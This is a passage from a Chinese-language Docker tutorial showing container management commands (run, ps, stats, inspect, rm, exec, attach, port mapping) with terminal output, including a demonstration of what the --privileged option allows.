ed65e55c4248        httpd               "httpd-foreground"   3 minutes ago       Up 3 minutes        80/tcp              eloquent_elion

[root@centos7 ~]# docker ps -a
CONTAINER ID        IMAGE               COMMAND              CREATED             STATUS                         PORTS               NAMES
ed65e55c4248        httpd               "httpd-foreground"   3 minutes ago       Up 3 minutes                   80/tcp              eloquent_elion
ed169d628ee4        httpd               "-d"                 3 minutes ago       Created                        80/tcp              zen_volhard


#手动强行停止容器
[root@centos7 ~]# docker stop ed65e55c4248


#注意: 容器启动后,如果容器内没有前台运行的进程,将自动退出停止
从容器内退出,并停止容器
 exit
 
从容器内退出,且容器不停止
同时按三个键，ctrl+p+q




#指定容器起名字
[root@centos7 ~]# docker run --name liunginx nginx
[root@centos7 ~]# docker ps -a
CONTAINER ID        IMAGE               COMMAND                  CREATED             STATUS                          PORTS               NAMES
56cf0f53359d        nginx               "/docker-entrypoint.…"   2 minutes ago       Exited (0) About a minute ago                       liunginx   #起的名字！！
ed65e55c4248        httpd               "httpd-foreground"       5 hours ago         Exited (0) 8 minutes ago                            eloquent_elion
ed169d628ee4        httpd               "-d"                     5 hours ago         Created                         80/tcp              zen_volhard
ac705518536a        hello-world         "/hello"                 6 hours ago         Exited (0) 6 hours ago                              bold_nightingale
e9ca09040e1a        hello-world         "/hello"                 33 hours ago        Exited (0) 33 hours ago                             funny_faraday
fa968053b1a5        hello-world         "/hello"                 33 hours ago        Exited (0) 33 hours ago                             hopeful_mayer
b7e0a169db77        hello-world         "/hello"                 33 hours ago        Exited (0) 33 hours ago                             blissful_hypatia
bf5a404ac51a        hello-world         "/hello"                 33 hours ago        Exited (0) 33 hours ago                             flamboyant_curran
[root@centos7 ~]# docker stop liunginx
[root@centos7 ~]# docker rm liunginx




#运行交互式容器并退出
[root@centos7 ~]# docker run -it centos bash
[root@6589943f3331 /]# uname -r
3.10.0-1160.el7.x86_64   #共享宿主机内核
[root@6589943f3331 /]# ls /
bin  dev  etc  home  lib  lib64  lost+found  media  mnt  opt  proc  root  run  sbin  srv  sys  tmp  usr  var
[root@centos7 ~]# docker stop 86ded4f63471
86ded4f63471
[root@centos7 ~]# docker rm 86ded4f63471
86ded4f63471




#设置容器内的主机名
[root@centos7 ~]# docker run -it -h blog.liusenbiao.org centos
[root@blog /]# hostname
blog.liusenbiao.org




#一次性运行容器，退出后立即删除，用于测试
[root@centos7 ~]# docker run --rm -it centos bash
[root@af080c84f3fa /]# exit
exit
[root@centos7 ~]# docker ps -a
CONTAINER ID        IMAGE               COMMAND             CREATED             STATUS              PORTS               NAMES
```

**--privileged 选项**

```
大约在0.6版，--privileged 选项被引入docker。使用该参数，container内的root拥有真正的root权限。

否则，container内的root只是外部的一个普通用户权限。privileged启动的容器，可以看到很多host上的设备，并且可以执行mount。甚至允许你在docker容器中启动docker容器。




范例: 使用--privileged 让容器获取root权限
#[root@centos8 ~]#podman run -it centos
[root@centos8 ~]#docker run -it centos
[root@382ab09932a7 /]#cat /etc/redhat-release 
CentOS Linux release 8.1.1911 (Core) 
[root@382ab09932a7 /]# lsblk
NAME   MAJ:MIN RM SIZE RO TYPE MOUNTPOINT
sda      8:0    0 200G  0 disk 
|-sda1   8:1    0   1G  0 part 
|-sda2   8:2    0 100G  0 part 
|-sda3   8:3    0   50G  0 part 
|-sda4   8:4    0   1K  0 part 
`-sda5   8:5   0   2G 0 part [SWAP]
sr0     11:0    1   7G  0 rom  
[root@382ab09932a7 /]# mount /dev/sda3 /mnt
mount: /mnt: permission denied.
[root@382ab09932a7 /]# exit
exit



#利用--privileged 选项运行容器
[root@centos8 ~]#podman run -it --privileged  centos
[root@centos8 ~]#docker run -it --privileged  centos
#可以看到宿主机的设备
[root@a6391a8f82e3 /]# lsblk
NAME   MAJ:MIN RM SIZE RO TYPE MOUNTPOINT
sda      8:0    0 200G  0 disk 
|-sda1   8:1    0   1G  0 part 
|-sda2   8:2    0 100G  0 part 
|-sda3   8:3    0   50G  0 part 
|-sda4   8:4    0   1K  0 part 
`-sda5   8:5   0   2G 0 part [SWAP]
sr0     11:0    1   7G  0 rom  
[root@a6391a8f82e3 /]# df
Filesystem     1K-blocks   Used Available Use% Mounted on
overlay        104806400 2754832 102051568   3% /
tmpfs              65536       0     65536   0% /dev
tmpfs             408092    5892    402200   2% /etc/hosts
shm                64000       0     64000   0% /dev/shm
tmpfs             408092       0    408092   0% /sys/fs/cgroup



[root@a6391a8f82e3 /]# mount /dev/sda3 /mnt
[root@a6391a8f82e3 /]# df
Filesystem     1K-blocks   Used Available Use% Mounted on
overlay        104806400 2754632 102051768   3% /
tmpfs              65536       0     65536   0% /dev
tmpfs             408092    5892    402200   2% /etc/hosts
shm                64000       0     64000   0% /dev/shm
tmpfs             408092       0    408092   0% /sys/fs/cgroup
/dev/sda3       52403200  619068  51784132   2% /mnt
[root@a6391a8f82e3 /]# touch /mnt/containter.txt
[root@a6391a8f82e3 /]# echo container data > /mnt/containter.txt
[root@a6391a8f82e3 /]# cat /mnt/containter.txt
container data



#在宿主机查看是否生成文件
[root@centos8 ~]#lsblk
NAME   MAJ:MIN RM SIZE RO TYPE MOUNTPOINT
sda      8:0    0 200G  0 disk 
├─sda1   8:1    0   1G  0 part /boot
├─sda2   8:2    0 100G  0 part /
├─sda3   8:3    0   50G  0 part /data
├─sda4   8:4    0   1K  0 part 
└─sda5   8:5    0   2G  0 part [SWAP]
sr0     11:0    1   7G  0 rom 
[root@centos8 ~]#ll /data/containter.txt
-rw-r--r-- 1 root root 25 Feb 29 12:26 /data/containter.txt
[root@centos8 ~]#cat /data/containter.txt 
container data
[root@centos8 ~]#echo host data >> /data/containter.txt
[root@centos8 ~]#cat /data/containter.txt 
container data
host data



#在容器内可看文件是否发生变化
[root@a6391a8f82e3 /]# cat /mnt/containter.txt
container data
host data
```

**范例: 运行docker官方文档容器**

```
#把容器的4000端口映射成宿主机的4000端口
[root@centos8 ~]#docker run -it -d -p 4000:4000 docs/docker.github.io:latest
[root@centos7 ~]# docker images
REPOSITORY              TAG                 IMAGE ID            CREATED             SIZE
nginx                   latest              605c77e624dd        7 months ago        141MB
redis                   latest              7614ae9453d1        7 months ago        113MB
docs/docker.github.io   latest              32ed84d97e30        2 years ago         1GB


[root@centos7 ~]# docker ps
CONTAINER ID        IMAGE                          COMMAND                  CREATED              STATUS              PORTS                            NAMES
14768222663b        docs/docker.github.io:latest   "/docker-entrypoint.…"   About a minute ago   Up About a minute   80/tcp, 0.0.0.0:4000->4000/tcp   goofy_babbage


[root@centos7 ~]# docker ps -a
CONTAINER ID        IMAGE                          COMMAND                  CREATED              STATUS              PORTS                            NAMES
14768222663b        docs/docker.github.io:latest   "/docker-entrypoint.…"   About a minute ago   Up About a minute   80/tcp, 0.0.0.0:4000->4000/tcp   goofy_babbage


[root@centos7 ~]# iptables -vnL -t nat
Chain DOCKER (2 references)
 pkts bytes target     prot opt in     out     source               destination         
    0     0 RETURN     all  --  docker0 *       0.0.0.0/0            0.0.0.0/0           
    2   104 DNAT       tcp  --  !docker0 *       0.0.0.0/0            0.0.0.0/0            tcp dpt:4000 to:172.17.0.2:4000  #宿主机4000映射容器的4000
    
    
#用浏览器访问http://localhost:4000/可以看到下面docker文档资料
```

![1659417388598](linux体系.assets/1659417388598.png)

##### 48.5.7.2 查看容器信息

**格式**

```
docker ps [OPTIONS]
docker container ls [OPTIONS]
选项:  
-a, --all             Show all containers (default shows just running)
-q, --quiet           Only display numeric IDs
-s, --size           Display total file sizes
-f, --filter filter   Filter output based on conditions provided
-l, --latest         Show the latest created container (includes all states)
-n, --last int       Show n last created containers (includes all states) 
(default -1)
```

**范例:**

```
#显示运行的容器
[root@ubuntu1804 ~]#docker ps  
[root@centos7 ~]# docker ps
CONTAINER ID        IMAGE                          COMMAND                  CREATED              STATUS              PORTS                            NAMES
14768222663b        docs/docker.github.io:latest   "/docker-entrypoint.…"   About a minute ago   Up About a minute   80/tcp, 0.0.0.0:4000->4000/tcp   goofy_babbage


#显示全部容器，包括退出状态的容器
[root@ubuntu1804 ~]#docker ps -a
CONTAINER ID        IMAGE                          COMMAND                  CREATED              STATUS              PORTS                            NAMES
14768222663b        docs/docker.github.io:latest   "/docker-entrypoint.…"   About a minute ago   Up About a minute   80/tcp, 0.0.0.0:4000->4000/tcp   goofy_babbage


#只显示容器ID
[root@ubuntu1804 ~]#docker ps -a -q
d7ece7f62532
dcdf71d17177


#显示容器大小
[root@centos7 ~]# docker ps -a -s
CONTAINER ID        IMAGE                          COMMAND                  CREATED             STATUS              PORTS                            NAMES               SIZE
14768222663b        docs/docker.github.io:latest   "/docker-entrypoint.…"   8 minutes ago       Up 8 minutes        80/tcp, 0.0.0.0:4000->4000/tcp   goofy_babbage       2B (virtual 1GB)


#显示最新创建的容器(停止的容器也能显示)
[root@ubuntu1804 ~]#docker ps -l


#显示指定状态的容器
[root@centos7 ~]# docker ps -f 'status=exited'
CONTAINER ID        IMAGE                          COMMAND                  CREATED             STATUS                     PORTS               NAMES
14768222663b        docs/docker.github.io:latest   "/docker-entrypoint.…"   10 minutes ago      Exited (0) 3 seconds ago                       goofy_babbage
```

**查看容器内的进程**

```
docker top CONTAINER [ps OPTIONS]



范例:
[root@centos7 ~]# docker ps
CONTAINER ID        IMAGE                          COMMAND                  CREATED             STATUS              PORTS                            NAMES
14768222663b        docs/docker.github.io:latest   "/docker-entrypoint.…"   16 minutes ago      Up 5 minutes        80/tcp, 0.0.0.0:4000->4000/tcp   goofy_babbage


#查看容器内的进程
[root@centos7 ~]# docker top 14768222663b
UID                 PID                 PPID                C                   STIME               TTY                 TIME                CMD
root                4213                4195                0                   21:22               pts/0               00:00:00            nginx: master process nginx -g daemon off;
101                 4242                4213                0                   21:22               pts/0               00:00:00            nginx: worker process
101                 4243                4213                0                   21:22               pts/0               00:00:00            nginx: worker process
101                 4244                4213                0                   21:22               pts/0               00:00:00            nginx: worker process
101                 4245                4213                0                   21:22               pts/0               00:00:00            nginx: worker process
```

**查看容器资源使用情况**

```
docker stats [OPTIONS] [CONTAINER...]

Display a live stream of container(s) resource usage statistics

Options:
-a, --all             Show all containers (default shows just running)
    --format string   Pretty-print images using a Go template
    --no-stream       Disable streaming stats and only pull the first result：只显示一次结果
    --no-trunc       Do not truncate output
```

**范例:** 

```
[root@centos7 ~]# docker stats 14768222663b
CONTAINER ID        NAME                CPU %               MEM USAGE / LIMIT     MEM %               NET I/O             BLOCK I/O           PIDS
14768222663b        goofy_babbage       0.00%               3.445MiB / 1.777GiB   0.19%               2kB / 613B          0B / 0B             133


#默认启动elasticsearch会使用较多的内存
[root@centos7 ~]# docker run -d --name elasticsearch -p 9200:9200 -p 9300:9300 -e "discovery.type=single-node" elasticsearch:7.6.2
[root@ubuntu1804 ~]#curl 10.0.0.100:9200
{
  "name" : "29282e91d773",
  "cluster_name" : "docker-cluster",
  "cluster_uuid" : "w5lp_XmITliWa2Yc-XwJFw",
  "version" : {
    "number" : "7.6.2",
    "build_flavor" : "default",
    "build_type" : "docker",
    "build_hash" : "ef48eb35cf30adf4db14086e8aabd07ef6fb113f",
    "build_date" : "2020-03-26T06:34:37.794943Z",
    "build_snapshot" : false,
     "lucene_version" : "8.4.0",
    "minimum_wire_compatibility_version" : "6.8.0",
    "minimum_index_compatibility_version" : "6.0.0-beta1"
 },
  "tagline" : "You Know, for Search"
}


#查看所有容器
[root@ubuntu1804 ~]#docker stats
CONTAINER ID NAME   CPU %   MEM USAGE / LIMIT MEM % NET I/O BLOCK I/O     PIDS
5e470e7970f6 suspi  0.00%   3.992MiB / 1.924Gi0.20% 656B / 0B9.2MB / 8.19kB    2
829bcebbc9f6 elast  0.58%   1.24GiB / 1.924GiB64.43%2.97kB / 512kB / 729kB    47


#限制内存使用大小
[root@ubuntu1804 ~]#docker run -d --name elasticsearch -p 9200:9200 -p 9300:9300 -e "discovery.type=single-node" -e ES_JAVA_OPTS="-Xms64m -Xmx128m" elasticsearch:7.6.2


[root@ubuntu1804 ~]#docker stats
CONTAINER ID NAME CPU % MEM USAGE / LIMIT     MEM % NET I/O   BLOCK     PIDS
29282e91d773 elasti254.23310.5MiB / 1.924GiB   15.76% 766B / 0B 766kB /46kB 22
```

**查看容器的详细信息**

docker inspect 可以查看docker各种对象的详细信息,包括:镜像,容器,网络等

```
docker inspect [OPTIONS] NAME|ID [NAME|ID...]
Options:
-f, --format string   Format the output using the given Go template
-s, --size           Display total file sizes if the type is container
```

**范例:** 

```
[root@centos7 ~]# docker images
REPOSITORY              TAG                 IMAGE ID            CREATED             SIZE
nginx                   latest              605c77e624dd        7 months ago        141MB
redis                   latest              7614ae9453d1        7 months ago        113MB
docs/docker.github.io   latest              32ed84d97e30        2 years ago         1GB


[root@centos7 ~]# docker inspect nginx
[
    {
        "Id": "sha256:605c77e624ddb75e6110f997c58876baa13f8754486b461117934b24a9dc3a85",
        "RepoTags": [
            "nginx:latest"
        ],
        "RepoDigests": [
            "nginx@sha256:0d17b565c37bcbd895e9d92315a05c1c3c9a29f762b011a10c54a66cd53c9b31"
        ],
        "Parent": "",
        "Comment": "",
        "Created": "2021-12-29T19:28:29.892199479Z",
        "Container": "ca3e48389f7160bc9d9a892d316fcbba459344ee3679998739b1c3cd8e56f7da",
        "ContainerConfig": {
            "Hostname": "ca3e48389f71",
            "Domainname": "",
            "User": "",
            "AttachStdin": false,
            "AttachStdout": false,
            "AttachStderr": false,
            "ExposedPorts": {
                "80/tcp": {}
            },
            "Tty": false,
            "OpenStdin": false,
            "StdinOnce": false,
            "Env": [
                "PATH=/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin",
                "NGINX_VERSION=1.21.5",
                "NJS_VERSION=0.7.1",
                "PKG_RELEASE=1~bullseye"
            ],
            "Cmd": [
                "/bin/sh",
                "-c",
                "#(nop) ",
                "CMD [\"nginx\" \"-g\" \"daemon off;\"]"
            ],
            "Image": "sha256:82941edee2f4d17c55563bb926387c3ae39fa1a99777f088bc9d3db885192209",
            "Volumes": null,
            "WorkingDir": "",
            "Entrypoint": [
                "/docker-entrypoint.sh"
            ],
            "OnBuild": null,
            "Labels": {
                "maintainer": "NGINX Docker Maintainers <docker-maint@nginx.com>"
            },
            "StopSignal": "SIGQUIT"
        },
        "DockerVersion": "20.10.7",
        "Author": "",
        "Config": {
            "Hostname": "",
            "Domainname": "",
            "User": "",
            "AttachStdin": false,
            "AttachStdout": false,
            "AttachStderr": false,
            "ExposedPorts": {
                "80/tcp": {}
            },
            "Tty": false,
            "OpenStdin": false,
            "StdinOnce": false,
            "Env": [
                "PATH=/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin",
                "NGINX_VERSION=1.21.5",
                "NJS_VERSION=0.7.1",
                "PKG_RELEASE=1~bullseye"
            ],
            "Cmd": [
                "nginx",
                "-g",
                "daemon off;"
            ],
            "Image": "sha256:82941edee2f4d17c55563bb926387c3ae39fa1a99777f088bc9d3db885192209",
            "Volumes": null,
            "WorkingDir": "",
            "Entrypoint": [
                "/docker-entrypoint.sh"
            ],
            "OnBuild": null,
            "Labels": {
                "maintainer": "NGINX Docker Maintainers <docker-maint@nginx.com>"
            },
            "StopSignal": "SIGQUIT"
        },
        "Architecture": "amd64",
        "Os": "linux",
        "Size": 141479488,
        "VirtualSize": 141479488,
        "GraphDriver": {
            "Data": {
                "LowerDir": "/var/lib/docker/overlay2/87ace7b429e827db094e6850df675701e137f7be5ebd99edbd23d941c9f666d5/diff:/var/lib/docker/overlay2/8e188254768985afbdf4e79850adaa61a8ffd9c244b3b357015e71db74b33a94/diff:/var/lib/docker/overlay2/bdbed9a8e9794a0a1ae447f568f3e99646f8a4444f155d4914635287f5629276/diff:/var/lib/docker/overlay2/31f8d4e389e1352c708d80b6a474efdc3417217653e6556aea1767b906c7ad4b/diff:/var/lib/docker/overlay2/9c55fb23cdfa634caffbabb773a1b475acbc215aa5ba964ea2f0536e2019204d/diff",
                "MergedDir": "/var/lib/docker/overlay2/36aa99b0fb369d65bc83c50f35a910267f4a2cf2333d9a287a69291c0e1db023/merged",
                "UpperDir": "/var/lib/docker/overlay2/36aa99b0fb369d65bc83c50f35a910267f4a2cf2333d9a287a69291c0e1db023/diff",
                "WorkDir": "/var/lib/docker/overlay2/36aa99b0fb369d65bc83c50f35a910267f4a2cf2333d9a287a69291c0e1db023/work"
            },
            "Name": "overlay2"
        },
        "RootFS": {
            "Type": "layers",
            "Layers": [
                "sha256:2edcec3590a4ec7f40cf0743c15d78fb39d8326bc029073b41ef9727da6c851f",
                "sha256:e379e8aedd4d72bb4c529a4ca07a4e4d230b5a1d3f7a61bc80179e8f02421ad8",
                "sha256:b8d6e692a25e11b0d32c5c3dd544b71b1085ddc1fddad08e68cbd7fda7f70221",
                "sha256:f1db227348d0a5e0b99b15a096d930d1a69db7474a1847acbc31f05e4ef8df8c",
                "sha256:32ce5f6a5106cc637d09a98289782edf47c32cb082dc475dd47cbf19a4f866da",
                "sha256:d874fd2bc83bb3322b566df739681fbd2248c58d3369cb25908d68e7ed6040a6"
            ]
        },
        "Metadata": {
            "LastTagTime": "0001-01-01T00:00:00Z"
        }
    }
]



#查看创建时间
[root@centos7 ~]# docker inspect -f "{{.Created}}" nginx
2021-12-29T19:28:29.892199479Z


[root@ubuntu1804 ~]#docker inspect -f "{{.Metadata}}" test:v1.0
{2020-07-24 21:56:42.247448035 +0800 CST}

[root@ubuntu1804 ~]#docker inspect --format="{{.Created}}" c1
2020-07-24T13:37:11.006574248Z


#获取容器的IP
docker inspect -f "{{.NetworkSettings.IPAddress}}" 容器ID
```

##### 48.5.7.3 删除容器

**docker rm 可以删除容器，即使容器正在运行当中，也可以被强制删除掉**

```
docker rm [OPTIONS] CONTAINER [CONTAINER...]
docker container rm [OPTIONS] CONTAINER [CONTAINER...]


#选项:  
-f, --force     Force the removal of a running container (uses SIGKILL)
-v, --volumes   Remove the volumes associated with the container


#删除停止的容器
docker container prune [OPTIONS]
Options:
      --filter filter   Provide filter values (e.g. 'until=<timestamp>')
  -f, --force           Do not prompt for confirmation
```

**范例**

```
[root@ubuntu1804 ~]#docker ps -a
CONTAINER ID       IMAGE               COMMAND             CREATED             
STATUS                     PORTS               NAMES
868b33da850c       alpine              "/bin/sh"           2 minutes ago       
Up 2 minutes                                   alpine5
3a05bbf66dac       alpine              "/bin/sh"           3 minutes ago       
Exited (0) 3 minutes ago                       alpine4
df428caf7128       alpine              "/bin/sh"           3 minutes ago       
Up 3 minutes                                   alpine3
6d64f47a83e6       alpine              "/bin/sh"           3 minutes ago       
Exited (0) 3 minutes ago                       alpine2
edd2ac2690e6       alpine              "/bin/sh"           4 minutes ago       
Exited (0) 4 minutes ago                       alpine1

[root@ubuntu1804 ~]#docker rm 3a05bbf66dac
3a05bbf66dac

[root@ubuntu1804 ~]#docker rm alpine5
Error response from daemon: You cannot remove a running container 
868b33da850cfcc7db8b84150fb9c7686b577889f10425bb4c5e17f28cf68a29. Stop the 
container before attempting removal or force remove

[root@ubuntu1804 ~]#docker rm -f alpine5
alpine5



#删除所有容器
[root@ubuntu1804 ~]#docker rm -f `docker ps -a -q`
df428caf7128
6d64f47a83e6
edd2ac2690e6

[root@ubuntu1804 ~]#docker ps -a -q | xargs docker rm -f



#删除指定状态的容器
[root@ubuntu1804 ~]#docker rm `docker ps -qf status=exited`
dd002f947cbe


#删除所有停止的容器
[root@ubuntu1804 ~]#docker container prune -f 
Deleted Containers:
37ba6ef81e33102a9cf4547ed10095d2298e29c8d67991b31390d5db8001dbcf
6c674c7ced422c7c29f218118c8b5da734ccebb9da31cdd3f64e7c658d2882a4


Total reclaimed space: 0B
```

##### 48.5.7.4 容器的启动和停止

**格式**

```
docker start|stop|restart|pause|unpause 容器ID
```

**批量正常启动或关闭所有容器**

```
docker start $(docker ps -a -q)  
docker stop $(docker ps -a -q)
```

**范例:** 

```
#启动和停止所有容器
[root@ubuntu1804 ~]#docker rm -f `docker ps -a -q`
b722c745406c
8d9342b35589
[root@ubuntu1804 ~]#docker run -d --name nginx1 nginx 
1f3f82995e052647678fd27bfa27a5b5615efc129270698cbaac3120544d6609
[root@ubuntu1804 ~]#docker run -d --name nginx2 nginx 
dd002f947cbe786ac0e834e06744337556f82d5850f4b16e01f12b9b3759f83e

[root@ubuntu1804 ~]#docker ps -a
CONTAINER ID       IMAGE               COMMAND                 CREATED         
    STATUS             PORTS               NAMES
dd002f947cbe       nginx               "nginx -g 'daemon of…"   4 seconds ago   
    Up 3 seconds        80/tcp             nginx2
1f3f82995e05       nginx               "nginx -g 'daemon of…"   7 seconds ago   
    Up 6 seconds        80/tcp             nginx1
    
    
[root@ubuntu1804 ~]#docker stop `docker ps -a -q`
dd002f947cbe
1f3f82995e05
[root@ubuntu1804 ~]#docker ps -a
CONTAINER ID       IMAGE               COMMAND                 CREATED         
    STATUS                     PORTS               NAMES
dd002f947cbe       nginx               "nginx -g 'daemon of…"   22 seconds ago 
    Exited (0) 2 seconds ago                       nginx2
1f3f82995e05       nginx               "nginx -g 'daemon of…"   25 seconds ago 
    Exited (0) 2 seconds ago                       nginx1
    
    
[root@ubuntu1804 ~]#docker start `docker ps -a -q`
dd002f947cbe
1f3f82995e05
[root@ubuntu1804 ~]#docker ps -a
CONTAINER ID       IMAGE               COMMAND                 CREATED         
    STATUS             PORTS               NAMES
dd002f947cbe       nginx               "nginx -g 'daemon of…"   2 minutes ago   
    Up 1 second         80/tcp             nginx2
1f3f82995e05       nginx               "nginx -g 'daemon of…"   2 minutes ago   
    Up 1 second         80/tcp             nginx1
    
    
    
    
#暂停和恢复容器
[root@ubuntu1804 ~]#docker run -d --name n1 nginx
48a8278f5df1d0b0c2c42c01d4e53d335df7e3e866fc7b68563cc2ac545fc07d
[root@ubuntu1804 ~]#docker top n1
UID                 PID                 PPID               C                   
STIME               TTY                 TIME               CMD
root                2104                2076                0                   
22:51               ?                   00:00:00           nginx: master 
process nginx -g daemon off;
systemd+            2168                2104                0                   
22:51               ?                   00:00:00           nginx: worker 
process
[root@ubuntu1804 ~]#ps aux|grep nginx
root       2104  0.3  0.2  10628  5324 ?       Ss   22:51   0:00 nginx: master 
process nginx -g daemon off;
systemd+   2168  0.0  0.1  11056  2580 ?       S    22:51   0:00 nginx: worker 
process
root       2188  0.0  0.0  14428  1040 pts/0   S+   22:51   0:00 grep --
color=auto nginx

[root@ubuntu1804 ~]#docker pause n1
n1
[root@ubuntu1804 ~]#docker ps 
CONTAINER ID       IMAGE               COMMAND                 CREATED         
    STATUS                 PORTS               NAMES
48a8278f5df1       nginx               "/docker-entrypoint.…"   3 minutes ago   
    Up 3 minutes (Paused)   80/tcp
    n1
[root@ubuntu1804 ~]#ps aux|grep nginx
root       2104  0.0  0.2  10628  5324 ?       Ds   22:51   0:00 nginx: master 
process nginx -g daemon off;
systemd+   2168  0.0  0.1  11056  2580 ?       D    22:51   0:00 nginx: worker 
process
root       2494  0.0  0.0  14428  1004 pts/0   R+   22:54   0:00 grep --
color=auto nginx

[root@ubuntu1804 ~]#docker unpause n1
n1

[root@ubuntu1804 ~]#ps aux|grep nginx
root       2104  0.0  0.2  10628  5324 ?       Ss   22:51   0:00 nginx: master 
process nginx -g daemon off;
systemd+   2168  0.0  0.1  11056  2580 ?       S    22:51   0:00 nginx: worker 
process
root       2521  0.0  0.0  14428  1028 pts/0   S+   22:55   0:00 grep --
color=auto nginx
```

##### 48.5.7.5 给正在运行的容器发信号

docker kill 可以给容器发信号,默认号SIGKILL,即9信号

```
格式
docker kill [OPTIONS] CONTAINER [CONTAINER...]

#选项:
-s, --signal string   Signal to send to the container (default "KILL")


[root@centos7 ~]# docker ps
CONTAINER ID        IMAGE               COMMAND                  CREATED             STATUS              PORTS               NAMES
13f555a10eb4        nginx               "/docker-entrypoint.…"   2 seconds ago       Up 2 seconds        80/tcp              sweet_darwin

[root@centos7 ~]# docker kill nginx 
Error response from daemon: Cannot kill container: nginx: No such container: nginx

[root@centos7 ~]# docker kill 13f555a10eb4
13f555a10eb4

[root@centos7 ~]# docker ps
CONTAINER ID        IMAGE               COMMAND             CREATED             STATUS              PORTS               NAMES



#关闭所有容器
#强制关闭所有运行中的容器
[root@ubuntu1804 ~]#docker kill `docker ps -a -q`
dd002f947cbe
1f3f82995e05
```

##### 48.5.7.6 进入正在运行的容器

**使用attach命令**

```
docker attach 容器名，attach 类似于vnc，操作会在同一个容器的多个会话界面同步显示，所有使用此方式进入容器的操作都是同步显示的，且使用exit退出后容器自动关闭，不推荐使用，需要进入到有shell环境的容器。
简单一句话：使用attach命令类似于共享桌面。
```

**范例:** 

```
格式:
docker attach [OPTIONS] CONTAINER


[root@ubuntu1804 ~]#docker run -it centos
[root@94a5c5c69b14 /]# cat /etc/redhat-release 
CentOS Linux release 8.1.1911 (Core) #ctrl+p+q 退出

[root@94a5c5c69b14 /]# [root@ubuntu1804 ~]#docker ps 
CONTAINER ID       IMAGE               COMMAND             CREATED             
STATUS             PORTS               NAMES
94a5c5c69b14       centos              "/bin/bash"         14 seconds ago     
Up 14 seconds                           unruffled_ellis
[root@ubuntu1804 ~]#docker attach 94a5
[root@94a5c5c69b14 /]#cat /etc/redhat-release


#同时在第二个终端attach到同一个容器，执行命令，可以在前一终端看到显示图面是同步的
[root@ubuntu1804 ~]#docker attach 94a5
[root@94a5c5c69b14 /]#cat /etc/redhat-release
CentOS Linux release 8.1.1911 (Core) 
[root@92a8279611a9 /]# exit #两个终端都同时退出
exit

[root@ubuntu1804 ~]#docker ps -a
CONTAINER ID       IMAGE               COMMAND             CREATED             
STATUS                     PORTS               NAMES
92a8279611a9       centos              "/bin/bash"         4 minutes ago       
Exited (0) 39 seconds ago                       agitated_tesla
```

**使用exec命令**

```
在运行中的容器启动新进程,可以执行单次命令，以及进入容器。
测试环境使用此方式，使用exit退出,但容器还在运行，此为推荐方式。
```

**格式:** 

```
docker exec [OPTIONS] CONTAINER COMMAND [ARG...]
常用选项:  
-d, --detach               Detached mode: run command in the background
-e, --env list             Set environment variables
-i, --interactive         Keep STDIN open even if not attached
-t, --tty                 Allocate a pseudo-TTY
-it                       进行人机交互的方式

#常见用法
docker exec -it 容器ID sh|bash
```

**范例:** 

```
[root@centos7 ~]# docker run -itd centos
[root@centos7 ~]# docker ps
CONTAINER ID        IMAGE               COMMAND             CREATED             STATUS              PORTS               NAMES
2734274ab350        centos              "/bin/bash"         2 minutes ago       Up 2 minutes                            hopeful_rosalind


#进入容器，执行命令，exit退出但容器不停止
[root@centos7 ~]# docker exec -it 2734 bash
[root@2734274ab350 /]# ls
bin  dev  etc  home  lib  lib64  lost+found  media  mnt  opt  proc  root  run  sbin  srv  sys  tmp  usr  var
[root@2734274ab350 /]# exit
exit

[root@centos7 ~]# docker ps
CONTAINER ID        IMAGE               COMMAND             CREATED             STATUS              PORTS               NAMES
2734274ab350        centos              "/bin/bash"         5 minutes ago       Up 5 minutes                            hopeful_rosalind
```

##### 48.5.7.7 暴露所有容器端口

```
容器启动后,默认处于预定义的NAT网络中,所以外部网络的主机无法直接访问容器中网络服务。

docker run -P 可以将事先容器预定义的所有端口映射宿主机的网卡的随机端口，默认从32768开始使用随机端口时,当停止容器后再启动可能会导致端口发生变化。
```

**docker port 可以查看容器的端口映射关系**

```
格式
docker port CONTAINER [PRIVATE_PORT[/PROTO]]


#范例:
[root@centos7 ~]#docker port nginx-c1
443/tcp -> 0.0.0.0:8443
53/udp -> 0.0.0.0:8053
80/tcp -> 0.0.0.0:8080
[root@centos7 ~]#docker port nginx-c1 53/udp
0.0.0.0:8053
```

**范例:** 

```
[root@centos7 ~]#docker pull nginx
Using default tag: latest
latest: Pulling from library/nginx
8ec398bc0356: Pull complete 
a53c868fbde7: Pull complete 
79daf9dd140d: Pull complete 
Digest: sha256:70821e443be75ea38bdf52a974fd2271babd5875b2b1964f05025981c75a6717
Status: Downloaded newer image for nginx:latest
docker.io/library/nginx:latest

[root@centos7 ~]#docker ps -a
CONTAINER ID       IMAGE               COMMAND             CREATED             
STATUS             PORTS               NAMES

[root@centos7 ~]#ss -ntl
State     Recv-Q Send-Q         Local Address:Port                         
Peer Address:Port              
LISTEN     0      128                         *:22                               
      *:*                  
LISTEN     0      100                 127.0.0.1:25                               
      *:*                  
LISTEN     0      128                       :::22                               
      :::*                  
LISTEN     0      100                       ::1:25                               
      :::*  
      
      
      
#前台启动的会话窗口无法进行其他操作，除非退出，但是退出后容器也会退出
[root@centos7 ~]#docker run -P nginx 
172.17.0.1 - - [26/Jan/2020:06:44:56 +0000] "GET / HTTP/1.1" 200 612 "-"
"curl/7.29.0" "-"


#另开一个窗口执行下面命令
[root@centos7 ~]#ss -ntl
State     Recv-Q Send-Q         Local Address:Port                         
Peer Address:Port              
LISTEN     0      128                         *:22                               
      *:*                  
LISTEN     0      100                 127.0.0.1:25                               
      *:*                  
LISTEN     0      128                       :::22                               
      :::*                  
LISTEN     0      100                       ::1:25                               
      :::*                  
LISTEN     0      128                       :::32768                           
      :::* 
      
[root@centos7 ~]#docker ps 
CONTAINER ID       IMAGE               COMMAND                 CREATED         
    STATUS             PORTS                   NAMES
78086069642b       nginx               "nginx -g 'daemon of…"   23 seconds ago 
    Up 21 seconds       0.0.0.0:32768->80/tcp   gallant_austin
    
[root@centos7 ~]#curl 127.0.0.1:32768
<!DOCTYPE html>
<html>
<head>
<title>Welcome to nginx!</title>
<style>
   body {
       width: 35em;
       margin: 0 auto;
       font-family: Tahoma, Verdana, Arial, sans-serif;
   }
</style>
</head>
<body>
<h1>Welcome to nginx!</h1>
<p>If you see this page, the nginx web server is successfully installed and
working. Further configuration is required.</p>
<p>For online documentation and support please refer to
<a href="http://nginx.org/">nginx.org</a>.<br/>
Commercial support is available at
<a href="http://nginx.com/">nginx.com</a>.</p>
